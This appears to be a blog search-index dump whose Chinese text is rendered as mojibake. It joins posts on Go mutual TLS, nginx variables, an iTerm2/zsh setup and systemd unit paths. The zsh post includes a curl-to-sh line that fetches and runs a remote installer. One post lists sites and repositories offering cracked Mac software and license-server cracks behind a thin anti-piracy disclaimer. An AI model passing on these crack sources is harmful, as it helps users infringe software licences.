server.key\næ•°å­—è¯ä¹¦ server.crt\n```\n\n+ å®¢æˆ·ç«¯éªŒè¯æœåŠ¡ç«¯æ•°å­—è¯ä¹¦\n\n```\npackage main\n\t\nimport (\n\t\"crypto/tls\"\n\t\"crypto/x509\"\n\t\"fmt\"\n\t\"io/ioutil\"\n\t\"net/http\"\n)\n\t\nfunc main() {\n\t\n\tpool := x509.NewCertPool()\n\tcaCrt, err := ioutil.ReadFile(\"ca.crt\")\n\tif err != nil {\n\t\tfmt.Println(\"ReadFile err:\", err)\n\t\treturn\n\t}\n\tpool.AppendCertsFromPEM(caCrt)\n\t\n\tts := &http.Transport{\n\t\tTLSClientConfig: &tls.Config{\n\t\t\tRootCAs:            pool,\n\t\t\tInsecureSkipVerify: false,\n\t\t},\n\t}\n\tclient := &http.Client{Transport: ts}\n\t\n\tresp, err := client.Get(\"https://localhost:8081\")\n\tif err != nil {\n\t\tfmt.Println(\"error:\", err)\n\t\treturn\n\t}\n\tdefer resp.Body.Close()\n\tbody, err := ioutil.ReadAll(resp.Body)\n\tfmt.Println(string(body))\n}\n```\n\n\n\n# 3. å¯¹å®¢æˆ·ç«¯çš„è¯ä¹¦è¿›è¡Œæ ¡éªŒ(åŒå‘è¯ä¹¦æ ¡éªŒï¼‰\n\n+ è¦å¯¹å®¢æˆ·ç«¯æ•°å­—è¯ä¹¦è¿›è¡Œæ ¡éªŒï¼Œé¦–å…ˆå®¢æˆ·ç«¯éœ€è¦å…ˆæœ‰è‡ªå·±çš„è¯ä¹¦ã€‚\n\n```\nopenssl genrsa -out client.key 2048\n\t\nopenssl req -new -key client.key -subj \"/CN=tonybai_cn\" -out client.csr\n\t\nopenssl x509 -req -in client.csr -CA ca.crt -CAkey ca.key -CAcreateserial -out client.crt -days 5000\n```\n\n+ é¦–å…ˆserverç«¯éœ€è¦è¦æ±‚æ ¡éªŒclientç«¯çš„æ•°å­—è¯ä¹¦ï¼Œå¹¶ä¸”åŠ è½½ç”¨äºæ ¡éªŒæ•°å­—è¯ä¹¦çš„ca.crtï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦å¯¹serverè¿›è¡Œæ›´åŠ çµæ´»çš„æ§åˆ¶ï¼š\n\n```\npackage main\n\t\nimport (\n\t\"crypto/tls\"\n\t\"crypto/x509\"\n\t\"fmt\"\n\t\"io/ioutil\"\n\t\"net/http\"\n)\n\t\nfunc handler(w http.ResponseWriter, r *http.Request) {\n\tfmt.Fprintf(w, \"Hi, This is an example of https service in golang!\")\n}\n\t\nfunc main() {\n\tpool := x509.NewCertPool()\n\tcaCrt, err := ioutil.ReadFile(\"ca.crt\")\n\tif err != nil {\n\t\tfmt.Println(\"ReadFile err:\", err)\n\t\treturn\n\t}\n\tpool.AppendCertsFromPEM(caCrt)\n\t\n\ts := &http.Server{\n\t\tAddr:    \":8081\",\n\t\tHandler: http.HandlerFunc(handler),\n\t\tTLSConfig: &tls.Config{\n\t\t\tClientCAs:  pool,\n\t\t\tClientAuth: tls.RequireAndVerifyClientCert, //å¼ºåˆ¶æ ¡éªŒclientç«¯è¯ä¹¦\n\t\t},\n\t}\n\t\n\ts.ListenAndServeTLS(\"server.crt\", \"server.key\")\n}\n```\n\n+ clientç«¯å˜åŒ–ä¹Ÿå¾ˆå¤§ï¼Œéœ€è¦åŠ è½½client.keyå’Œclient.crtç”¨äºserverç«¯è¿æ¥æ—¶çš„è¯ä¹¦æ ¡éªŒï¼š\n\n```\npackage main\n\t\nimport (\n\t\"crypto/tls\"\n\t\"crypto/x509\"\n\t\"fmt\"\n\t\"io/ioutil\"\n\t\"net/http\"\n)\n\t\nfunc main() {\n\t\n\tpool := x509.NewCertPool()\n\tcaCrt, err := ioutil.ReadFile(\"ca.crt\")\n\tif err != nil {\n\t\tfmt.Println(\"ReadFile err:\", err)\n\t\treturn\n\t}\n\tpool.AppendCertsFromPEM(caCrt)\n\t\n\tcliCrt, err := tls.LoadX509KeyPair(\"client.crt\", \"client.key\")\n\tif err != nil {\n\t\tfmt.Println(\"Loadx509keypair err:\", err)\n\t\treturn\n\t}\n\t\n\tts := &http.Transport{\n\t\tTLSClientConfig: &tls.Config{\n\t\t\tRootCAs:            pool, //clientç«¯æ˜¯ RootCAs\n\t\t\tCertificates:       []tls.Certificate{cliCrt},\n\t\t\tInsecureSkipVerify: false,\n\t\t},\n\t}\n\tclient := &http.Client{Transport: ts}\n\t\n\tresp, err := client.Get(\"https://localhost:8081\")\n\tif err != nil {\n\t\tfmt.Println(\"error:\", err)\n\t\treturn\n\t}\n\tdefer resp.Body.Close()\n\tbody, err := ioutil.ReadAll(resp.Body)\n\tfmt.Println(string(body))\n}\n```","tags":["http"],"categories":["https"]},{"title":"macç ´è§£èµ„æºè½¯ä»¶æ”¶é›†","url":"%2Fp%2F6765e5a5.html","content":"\næ‹’ç»ç›—ç‰ˆä»æˆ‘åšèµ·ï¼Œä¸‹é¢è¢«åˆ é™¤çš„ç½‘ç«™æä¾›å¤§é‡ç ´è§£è½¯ä»¶ä¸‹è½½ï¼Œæ¬¢è¿å¤§å®¶ç›‘ç£å®ƒä»¬ã€‚ \n\n<!-- more -->\n\n# 1. è‹¹æœè½¯ä»¶ç ´è§£\n\n+  https://xclient.info/\n+  https://appstorrent.ru/\n+  https://www.torrentmac.net\n+  https://www.minorpatch.com\n\n+ https://www.macenjoy.co/\n\n+  https://www.macsky.net/\n+  https://nmac.to/\n+  https://www.naodai.org/\n\n\n\n### 1.1 æ±‡æ€»\n\n+ https://github.com/jaywcjlove/awesome-mac/blob/master/README-zh.md#%E7%9B%97%E7%89%88%E8%BD%AF%E4%BB%B6%E4%B8%8B%E8%BD%BD%E7%BD%91%E7%AB%99%E9%BB%91%E5%90%8D%E5%8D%95\n\n\n\n# 2. å…¶ä»–ç ´è§£\n\n+ ç™¾åº¦äº‘ç›˜ç ´è§£ https://github.com/proxyee-down-org/proxyee-down\n+ ç™¾åº¦äº‘ç›˜ç ´è§£ https://www.baiduwp.com/ (éœ€è¦å®‰è£…ua switchæ’ä»¶,å·²å¤±æ•ˆ)\n+ ç™¾åº¦äº‘ç›˜ç ´è§£ https://github.com/b3log/baidu-netdisk-downloaderx(å·²å¤±æ•ˆ)\n+ Jetbrains https://zhile.io/2018/08/25/jetbrains-license-server-crack.html\n+ Charles ç ´è§£  https://github.com/8enet/Charles-Crack\n+ Cleanmymac ç ´è§£ https://macbold.com/download-cleanmymac-fully-activated-free7t5/\n+ Ntfsformacç ´è§£ https://www.naodai.org/archives/50.html\n+ å°ä¼—è½¯ä»¶: https://www.appinn.com/category   é‡Œé¢æœ‰æ¯”è¾ƒæœ‰æ„æ€çš„è½¯ä»¶å’Œchromeæ’ä»¶\n","tags":["software"],"categories":["è½¯ä»¶"]},{"title":"nginxå…¨å±€å˜é‡","url":"%2Fp%2F80b24c5f.html","content":"\n### 1. æœåŠ¡å™¨ç›¸å…³\n\n| å˜é‡å                | å¤‡æ³¨                                                         | ç¤ºä¾‹                                               |\n| --------------------- | ------------------------------------------------------------ | -------------------------------------------------- |\n| `nginx_version`       | å½“å‰è¿è¡Œçš„ Nginx ç‰ˆæœ¬å·                                      | 1.11.2                                             |\n| `server_port`         | æœåŠ¡å™¨ç«¯å£                                                   | 8080                                               |\n| `server_addr`         | æœåŠ¡å™¨ç«¯åœ°å€                                                 | 127.0.0.1                                          |\n| `server_name`         | æœåŠ¡å™¨åç§°                                                   | 127.0.0.1                                          |\n| `server_protocol`     | æœåŠ¡å™¨çš„HTTPç‰ˆæœ¬                                             | HTTP/1.0                                           |\n| `status`              | HTTP å“åº”ä»£ç                                                 | 200                                                |\n| `time_iso8601`        | æœåŠ¡å™¨æ—¶é—´çš„ ISO 8610 æ ¼å¼                                   | 2018-09-02T15:14:27+08:00                          |\n| `time_local`          | æœåŠ¡å™¨æ—¶é—´ï¼ˆLOG Format æ ¼å¼ï¼‰                                | 02/Sep/2018:15:14:27 +0800                         |\n| `document_root`       | å½“å‰è¯·æ±‚çš„æ–‡æ¡£æ ¹ç›®å½•æˆ–åˆ«å                                   | `/home/xiaowu/github/echo.xuexb.com`               |\n| `request_filename`    | å½“å‰è¿æ¥è¯·æ±‚çš„æ–‡ä»¶è·¯å¾„ï¼Œç”± `root`æˆ– `alias`æŒ‡ä»¤ä¸ URI è¯·æ±‚ç”Ÿæˆ | `/home/xiaowu/github/echo.xuexb.com/api/dump/path` |\n| `request_completion`  | å¦‚æœè¯·æ±‚æˆåŠŸï¼Œå€¼ä¸ºâ€OKâ€ï¼Œå¦‚æœè¯·æ±‚æœªå®Œæˆæˆ–è€…è¯·æ±‚ä¸æ˜¯ä¸€ä¸ªèŒƒå›´è¯·æ±‚çš„æœ€åä¸€éƒ¨åˆ†ï¼Œåˆ™ä¸ºç©º |                                                    |\n| `pid`                 | å·¥ä½œè¿›ç¨‹çš„PID                                                | 1234                                               |\n| `msec`                | å½“å‰çš„Unixæ—¶é—´æˆ³                                             | 1535872750.954                                     |\n| `limit_rate`          | ç”¨äºè®¾ç½®å“åº”çš„é€Ÿåº¦é™åˆ¶                                       | 0                                                  |\n| `pipe`                | å¦‚æœè¯·æ±‚æ¥è‡ªç®¡é“é€šä¿¡ï¼Œå€¼ä¸ºâ€œpâ€ï¼Œå¦åˆ™ä¸ºâ€œ.â€                     | .                                                  |\n| `connection_requests` | TCPè¿æ¥å½“å‰çš„è¯·æ±‚æ•°é‡                                        | 1                                                  |\n| `connection`          | TCP è¿æ¥çš„åºåˆ—å·                                             | 363861                                             |\n| `realpath_root`       | å½“å‰è¯·æ±‚çš„æ–‡æ¡£æ ¹ç›®å½•æˆ–åˆ«åçš„çœŸå®è·¯å¾„ï¼Œä¼šå°†æ‰€æœ‰ç¬¦å·è¿æ¥è½¬æ¢ä¸ºçœŸå®è·¯å¾„ | /home/xiaowu/github/echo.xuexb.com                 |\n|                       \n\n<!-- more -->\n\n### 2. å®¢æˆ·ç«¯ç›¸å…³\n\n| å˜é‡å              | ç¤ºä¾‹                                                         | å¤‡æ³¨                                                         |\n| ------------------- | ------------------------------------------------------------ | ------------------------------------------------------------ |\n| host                | echo.xuexb.com                                               | ä¼˜å…ˆçº§å¦‚ä¸‹ï¼šHTTPè¯·æ±‚è¡Œçš„ä¸»æœºå>â€HOSTâ€è¯·æ±‚å¤´å­—æ®µ>ç¬¦åˆè¯·æ±‚çš„æœåŠ¡å™¨å |\n| hostname            | bj01                                                         | ä¸»æœºå                                                       |\n| remote_port         | 58500                                                        | å®¢æˆ·ç«¯ç«¯å£                                                   |\n| remote_user         |                                                              | ç”¨äºHTTPåŸºç¡€è®¤è¯æœåŠ¡çš„ç”¨æˆ·å                                 |\n| request             | GET /api/dump/path?a=1&%E4%B8%AD%E6%96%87=%E5%A5%BD%E7%9A%84%23123 HTTP/1.0 | ä»£è¡¨å®¢æˆ·ç«¯çš„è¯·æ±‚åœ°å€                                         |\n| remote_addr         | 127.0.0.1                                                    | å®¢æˆ·ç«¯åœ°å€                                                   |\n| request_body        |                                                              | å®¢æˆ·ç«¯çš„è¯·æ±‚ä¸»ä½“, æ­¤å˜é‡å¯åœ¨locationä¸­ä½¿ç”¨ï¼Œå°†è¯·æ±‚ä¸»ä½“é€šè¿‡proxy_pass, fastcgi_pass, uwsgi_pass, å’Œ scgi_passä¼ é€’ç»™ä¸‹ä¸€çº§çš„ä»£ç†æœåŠ¡å™¨ |\n| request_body_file   |                                                              | å°†å®¢æˆ·ç«¯è¯·æ±‚ä¸»ä½“ä¿å­˜åœ¨ä¸´æ—¶æ–‡ä»¶ä¸­æ–‡ä»¶å¤„ç†ç»“æŸåï¼Œæ­¤æ–‡ä»¶éœ€åˆ é™¤å¦‚æœéœ€è¦ä¹‹ä¸€å¼€å¯æ­¤åŠŸèƒ½ï¼Œéœ€è¦è®¾ç½®client_body_in_file_onlyå¦‚æœå°†æ¬¡æ–‡ä»¶ä¼ é€’ç»™åç«¯çš„ä»£ç†æœåŠ¡å™¨ï¼Œéœ€è¦ç¦ç”¨request bodyï¼Œå³è®¾ç½®proxy_pass_request_body offï¼Œfastcgi_pass_request_body off, uwsgi_pass_request_body off, or scgi_pass_request_body off |\n| proxy_protocol_addr |                                                              | è·å–ä»£ç†è®¿é—®æœåŠ¡å™¨çš„å®¢æˆ·ç«¯åœ°å€ï¼Œå¦‚æœæ˜¯ç›´æ¥è®¿é—®ï¼Œè¯¥å€¼ä¸ºç©ºå­—ç¬¦ä¸²(1.5.12) |\n| http_åç§°           | http_accept_language -> zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7  | åŒ¹é…ä»»æ„è¯·æ±‚å¤´å­—æ®µï¼› å˜é‡åä¸­çš„ååŠéƒ¨åˆ†â€œnameâ€å¯ä»¥æ›¿æ¢æˆä»»æ„è¯·æ±‚å¤´å­—æ®µï¼Œå¦‚åœ¨é…ç½®æ–‡ä»¶ä¸­éœ€è¦è·å–httpè¯·æ±‚å¤´ï¼šâ€œAccept-Languageâ€ï¼Œé‚£ä¹ˆå°†â€œï¼â€æ›¿æ¢ä¸ºä¸‹åˆ’çº¿ï¼Œå¤§å†™å­—æ¯æ›¿æ¢ä¸ºå°å†™ï¼Œå½¢å¦‚ï¼šhttp_accept_languageå³å¯ |\n| bytes_sent          | 0                                                            | ä¼ è¾“ç»™å®¢æˆ·ç«¯çš„å­—èŠ‚æ•° (1.3.8, 1.2.5)                          |\n| body_bytes_sent     | 0                                                            | ä¼ è¾“ç»™å®¢æˆ·ç«¯çš„å­—èŠ‚æ•°ï¼Œå“åº”å¤´ä¸è®¡ç®—åœ¨å†…ï¼›è¿™ä¸ªå˜é‡å’ŒApacheçš„mod_log_configæ¨¡å—ä¸­çš„â€œ%Bâ€å‚æ•°ä¿æŒå…¼å®¹ |\n\n\n\n### 3. å®¢æˆ·ç«¯ç›¸å…³ - request headers\n\n| å˜é‡å                           | å¤‡æ³¨                                                         | ç¤ºä¾‹                                                         |\n| -------------------------------- | ------------------------------------------------------------ | ------------------------------------------------------------ |\n| `http_accept`                    | æµè§ˆå™¨æ”¯æŒçš„ MIME ç±»å‹                                       | `text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8` |\n| `http_accept_encoding`           | æµè§ˆå™¨æ”¯æŒçš„å‹ç¼©ç¼–ç                                          | `gzip, deflate, br`                                          |\n| `http_accept_language`           | æµè§ˆå™¨æ”¯æŒçš„è¯­è¨€                                             | `zh-CN,zh;q=0.9,en;q=0.8`                                    |\n| `http_cache_control`             | æµè§ˆå™¨ç¼“å­˜                                                   | `max-age=0`                                                  |\n| `http_connection`                | å®¢æˆ·ç«¯ä¸æœåŠ¡è¿æ¥ç±»å‹                                         |                                                              |\n| `http_cookie`                    | æµè§ˆå™¨è¯·æ±‚ cookie                                            | `a=1; b=2`                                                   |\n| `http_host`                      | æµè§ˆå™¨è¯·æ±‚ host                                              | echo.xuexb.com                                               |\n| `http_referer`                   | æµè§ˆå™¨æ¥æº                                                   | https://echo.xuexb.com/                                      |\n| `http_upgrade_insecure_requests` | æ˜¯ä¸€ä¸ªè¯·æ±‚é¦–éƒ¨ï¼Œç”¨æ¥å‘æœåŠ¡å™¨ç«¯å‘é€ä¿¡å·ï¼Œè¡¨ç¤ºå®¢æˆ·ç«¯ä¼˜å…ˆé€‰æ‹©åŠ å¯†åŠå¸¦æœ‰èº«ä»½éªŒè¯çš„å“åº”ï¼Œå¹¶ä¸”å®ƒå¯ä»¥æˆåŠŸå¤„ç† upgrade-insecure-requests CSP æŒ‡ä»¤ | 1                                                            |\n| `http_user_agent`                | ç”¨æˆ·è®¾å¤‡æ ‡è¯†                                                 | `Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36` |\n| `http_x_requested_with`          | å¼‚æ­¥è¯·æ±‚æ ‡è¯†                                                 | true                                                         |\n| `http_x_forwarded_for`           | åå‘ä»£ç†åŸ IP                                                | 198.13.61.105                                                |\n\n\n\n### 4. é“¾æ¥ç›¸å…³\n\n| å˜é‡å           | å¤‡æ³¨                                                         | ç¤ºä¾‹                                                       |\n| ---------------- | ------------------------------------------------------------ | ---------------------------------------------------------- |\n| `scheme`         | è¯·æ±‚ä½¿ç”¨çš„ WEB åè®®                                          | http                                                       |\n| `uri`            | è¯·æ±‚ä¸­çš„å½“å‰ URI(ä¸å¸¦è¯·æ±‚å‚æ•°)ï¼Œå¯ä»¥ä¸åŒäºæµè§ˆå™¨ä¼ é€’çš„ `$request_uri` çš„å€¼ï¼Œå®ƒå¯ä»¥é€šè¿‡å†…éƒ¨é‡å®šå‘ï¼Œæˆ–è€…ä½¿ç”¨ `index` æŒ‡ä»¤è¿›è¡Œä¿®æ”¹ | `/api/dump/path`                                           |\n| `document_uri`   | åŒ `$uri`                                                    | `/api/dump/path`                                           |\n| `request_uri`    | è¿™ä¸ªå˜é‡ç­‰äºåŒ…å«ä¸€äº›å®¢æˆ·ç«¯è¯·æ±‚å‚æ•°çš„åŸå§‹ URI ï¼Œå®ƒæ— æ³•ä¿®æ”¹    | `/api/dump/path?a=1&%E4%B8%AD%E6%96%87=%E5%A5%BD%E7%9A%84` |\n| `request_method` | HTTP è¯·æ±‚æ–¹æ³•                                                | GET                                                        |\n| `request_time`   | å¤„ç†å®¢æˆ·ç«¯è¯·æ±‚ä½¿ç”¨çš„æ—¶é—´ï¼Œä»è¯»å–å®¢æˆ·ç«¯çš„ç¬¬ä¸€ä¸ªå­—èŠ‚å¼€å§‹è®¡æ—¶   | 0.000                                                      |\n| `request_length` | è¯·æ±‚çš„é•¿åº¦ï¼ˆåŒ…æ‹¬è¯·æ±‚åœ°å€ã€è¯·æ±‚å¤´å’Œè¯·æ±‚ä¸»ä½“ï¼‰                 | 678                                                        |\n| `args`           | è¯·æ±‚å‚æ•°                                                     | `a=1&%E4%B8%AD%E6%96%87=%E5%A5%BD%E7%9A%84`                |\n| `query_string`   | åŒ `$args`                                                   |                                                            |\n| `is_args`        | è¯·æ±‚ä¸­æ˜¯å¦æœ‰å‚æ•°ï¼Œæœ‰åˆ™ä¸º `?` å¦åˆ™ä¸ºç©º                        | `?`                                                        |\n| `arg_å‚æ•°å`     | è¯·æ±‚ä¸­å…·ä½“çš„å‚æ•°                                             | `$arg_a` => `1`                                            |\n| `https`          | å¦‚æœå¼€å¯äº† SSL å®‰å…¨æ¨¡å¼ï¼Œåˆ™ä¸º `on` å¦åˆ™ä¸ºç©º                  | `on`                                                       |\n\n\n\n### 5. å‚è€ƒèµ„æ–™\n\n+ https://xuexb.github.io/learn-nginx/variable/\n+ https://nginx.org/en/docs/\n","tags":["nginx"],"categories":["nginx"]},{"title":"iterm2é…ç½®zshå’Œå¸¸ç”¨æ’ä»¶","url":"%2Fp%2F6600d67c.html","content":"\nç›´æ¥çœ‹æ•ˆæœå›¾\n\n![1](iterm2é…ç½®zshå’Œå¸¸ç”¨æ’ä»¶/3.png)\n\n![1](iterm2é…ç½®zshå’Œå¸¸ç”¨æ’ä»¶/2.png)\n\n\n\n<!-- more -->\n\n# 1. å®‰è£…\n\n### 1.1 å®‰è£… ohmyzsh\n\n https://github.com/ohmyzsh/ohmyzsh\n\næ³¨æ„å®‰è£…ä¼šè¦†ç›– `.zshrc`, æå‰å¤‡ä»½ä¸‹\n\n```\nsh -c \"$(curl -fsSL https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)\"\n```\n\n`.zshrc`æ–‡ä»¶åŠ ä¸‹é¢é…ç½®\n\n```ini\n# ~/.zshrc\nexport ZSH=\"/Users/liuwei/.oh-my-zsh\"\n```\n\né‡ç½®ä¸‹é…ç½®æ–‡ä»¶\n\n```bash\nsource $ZSH/oh-my-zsh.sh\n```\n\n\n\n### 1.2  å®‰è£…ä¸»é¢˜ powerlevel10k\n\nhttps://github.com/romkatv/powerlevel10k\n\n```bash\ngit clone --depth=1 https://github.com/romkatv/powerlevel10k.git ${ZSH_CUSTOM:-$HOME/.oh-my-zsh/custom}/themes/powerlevel10k\n\n# è®¾ç½®ä¸»é¢˜  ~/.zshrc\nZSH_THEME=\"powerlevel10k/powerlevel10k\" \n```\n\n\n\n+ ä¸»é¢˜é…ç½®\n\n```bash\n# ~/.zshrc\nPOWERLEVEL9K_MODE='nerdfont-complete'\nZSH_THEME=\"powerlevel10k/powerlevel10k\"\nPOWERLEVEL9K_CONTEXT_TEMPLATE='%n'\nPOWERLEVEL9K_CONTEXT_DEFAULT_FOREGROUND='white'\nPOWERLEVEL9K_PROMPT_ON_NEWLINE=true\nPOWERLEVEL9K_MULTILINE_LAST_PROMPT_PREFIX=\"%F{014}\\u2570%F{cyan}\\uF460%F{073}\\uF460%F{109}\\uF460%f \"\nPOWERLEVEL9K_SHORTEN_DIR_LENGTH=1\nPOWERLEVEL9K_NODE_VERSION_BACKGROUND=\"002\"\nPOWERLEVEL9K_NODE_VERSION_FOREGROUND=\"black\"\nPOWERLEVEL9K_GO_VERSION_BACKGROUND=\"001\"\nPOWERLEVEL9K_GO_VERSION_FOREGROUND=\"black\"\nPOWERLEVEL9K_WIFI_BACKGROUND=\"003\"\nPOWERLEVEL9K_WIFI_FOREGROUND=\"black\"\nPOWERLEVEL9K_LEFT_PROMPT_ELEMENTS=(os_icon context ssh dir vcs)\nPOWERLEVEL9K_RIGHT_PROMPT_ELEMENTS=(status proxy anaconda node_version go_version wifi)\n\n# åœ¨ç»ˆç«¯ä¸‹æ‰§è¡Œä¸‹é¢çš„å‘½ä»¤, å¯ä»¥çœ‹åˆ°ä»£å·å¯¹åº”çš„é¢œè‰²\n# for i in {0..255}; do print -Pn \"%K{$i}  %k%F{$i}${(l:3::0:)i}%f \" ${${(M)$((i%6)):#3}:+$'\\n'}; done\n```\n\n\n\n### 1.3 å®‰è£…å­—ä½“\n\nä¸‹è½½æ¨èå­—ä½“\n\n+ https://github.com/romkatv/powerlevel10k#meslo-nerd-font-patched-for-powerlevel10k\n\nä¹Ÿå¯é€‰æ‹©å…¶ä»–å­—ä½“å®‰è£…\n\n  ```bash\n  # å‡ ä¸ªå­—ä½“ä»“åº“\n  https://github.com/powerline/fonts\n  https://github.com/gabrielelana/awesome-terminal-fonts\n  https://github.com/ryanoasis/nerd-fonts/\n  ```\n\nç„¶ååœ¨iterm2é‡Œé¢ï¼ŒæŠŠå­—ä½“æ”¹æˆåç¼€ä¸ºpowerlineçš„å­—ä½“å°±è¡Œäº†\n![1](iterm2é…ç½®zshå’Œå¸¸ç”¨æ’ä»¶/1.png)\n\n\n\n# 2. æ’ä»¶\n\n### 2.1 git\n\n```bash\n#.zshrc\nplugins=(git)\n```\n\n### 2.2 è‡ªåŠ¨è¡¥å……\n\nhttps://github.com/zsh-users/zsh-autosuggestions\n\n```bash\ngit clone https://github.com/zsh-users/zsh-autosuggestions ${ZSH_CUSTOM:-~/.oh-my-zsh/custom}/plugins/zsh-autosuggestions\n\n#.zshrc\nplugins=(zsh-autosuggestions)\n```\n\n### 2.3 è¯­æ³•é«˜äº®\n\nhttps://github.com/zsh-users/zsh-syntax-highlighting\n\n```bash\ngit clone https://github.com/zsh-users/zsh-syntax-highlighting.git ${ZSH_CUSTOM:-~/.oh-my-zsh/custom}/plugins/zsh-syntax-highlighting\n\n#.zshrc\nplugins=(zsh-syntax-highlighting)\n```\n\n\n\n# 3. é…è‰²\n\n### 3.1 é…è‰²é¡¹ç›®\n\n```bash\nhttps://github.com/dracula/dracula-theme/ # é€‰ç”¨çš„è¿™ä¸ª!!!å¥½çœ‹!!!æ”¯æŒå„ç§ç»ˆç«¯,å¸è¡€é¬¼é…è‰²\nhttps://github.com/mbadolato/iTerm2-Color-Schemes # è¿™ä¸Šé¢å¥½å¤š, æ…¢æ…¢æŒ‘\nhttps://github.com/MartinSeeler/iterm2-material-design \n```\n\n### 3.2 å®‰è£…dracula\n\nhttps://github.com/dracula/iterm\n\n```bash\ngit clone https://github.com/dracula/iterm.git\n\n#Activating theme\niTerm2 > Preferences > Profiles > Colors Tab\nOpen the Color Presets... drop-down in the bottom right corner\nSelect Import... from the list\n\nSelect the Dracula.itermcolors file\nSelect the Dracula from Color Presets...\n```\n\n\n\n# 4. é‡åˆ°çš„é—®é¢˜\n\n### 4.1 å›¾æ¡ˆä¸æ˜¾ç¤º\n\n```bash\nPOWERLEVEL9K_MODE='nerdfont-complete' #è¿™å¥è¯ä¸€å®šè¦åœ¨ä¸‹é¢sourceä¹‹å‰\nsource $ZSH/oh-my-zsh.sh\n```\n\n\n\n# 5. å‚è€ƒèµ„æ–™\n\n+ [æ‰“é€  Mac ä¸‹é«˜é¢œå€¼å¥½ç”¨çš„ç»ˆç«¯ç¯å¢ƒ](https://blog.biezhi.me/2018/11/build-a-beautiful-mac-terminal-environment.html)\n\n+ https://medium.com/@Clovis_app/configuration-of-a-beautiful-efficient-terminal-and-prompt-on-osx-in-7-minutes-827c29391961\n\n","tags":["iterm2"],"categories":["ç»ˆç«¯"]},{"title":"/etc/systemd/systemå’Œ/lib/systemd/systemçš„åŒºåˆ«","url":"%2Fp%2Fc1403091.html","content":"\n\n\n# 1. ç›®å½•\n\n### 1.1 [/usr]/lib/systemd/system/ \n\n (è½¯ä»¶åŒ…å®‰è£…çš„å•å…ƒ)\n\nThe expectation is that `/lib/systemd/system` is a directory that should only contain systemd unit files which were put there by the package manager (YUM/DNF/RPM/APT/etc).\n\n### 1.2 /etc/systemd/system/\n\n(ç³»ç»Ÿç®¡ç†å‘˜å®‰è£…çš„å•å…ƒ, ä¼˜å…ˆçº§æ›´é«˜)\n\nFiles in `/etc/systemd/system` are manually placed here by the operator of the system for ad-hoc software installations that are not in the form of a package. This would include tarball type software installations or home grown scripts.\n\n<!-- more -->\n\n# 2. ä¼˜å…ˆçº§\n\nsystemdçš„ä½¿ç”¨å¤§å¹…æé«˜äº†ç³»ç»ŸæœåŠ¡çš„è¿è¡Œæ•ˆç‡, è€Œunitçš„æ–‡ä»¶ä½ç½®ä¸€èˆ¬ä¸»è¦æœ‰ä¸‰ä¸ªç›®å½•ï¼š\n\n```\n       Table 1.  Load path when running in system mode (--system).\n       â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”\n       â”‚Path                    â”‚ Description                 â”‚\n       â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤\n       â”‚/etc/systemd/system     â”‚ Local configuration         â”‚\n       â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤\n       â”‚/run/systemd/system     â”‚ Runtime units               â”‚\n       â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤\n       â”‚/lib/systemd/system     â”‚ Units of installed packages â”‚\n       â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜\n```\n\n\n\nè¿™ä¸‰ä¸ªç›®å½•çš„é…ç½®æ–‡ä»¶ä¼˜å…ˆçº§ä¾æ¬¡ä»é«˜åˆ°ä½ï¼Œå¦‚æœåŒä¸€é€‰é¡¹ä¸‰ä¸ªåœ°æ–¹éƒ½é…ç½®äº†ï¼Œä¼˜å…ˆçº§é«˜çš„ä¼šè¦†ç›–ä¼˜å…ˆçº§ä½çš„ã€‚ \n\nç³»ç»Ÿå®‰è£…æ—¶ï¼Œé»˜è®¤ä¼šå°†unitæ–‡ä»¶æ”¾åœ¨`/lib/systemd/system`ç›®å½•ã€‚å¦‚æœæˆ‘ä»¬æƒ³è¦ä¿®æ”¹ç³»ç»Ÿé»˜è®¤çš„é…ç½®ï¼Œæ¯”å¦‚`nginx.service`ï¼Œä¸€èˆ¬æœ‰ä¸¤ç§æ–¹æ³•ï¼š\n\n1. åœ¨`/etc/systemd/system`ç›®å½•ä¸‹åˆ›å»º`nginx.service`æ–‡ä»¶ï¼Œé‡Œé¢å†™ä¸Šæˆ‘ä»¬è‡ªå·±çš„é…ç½®ã€‚\n2. 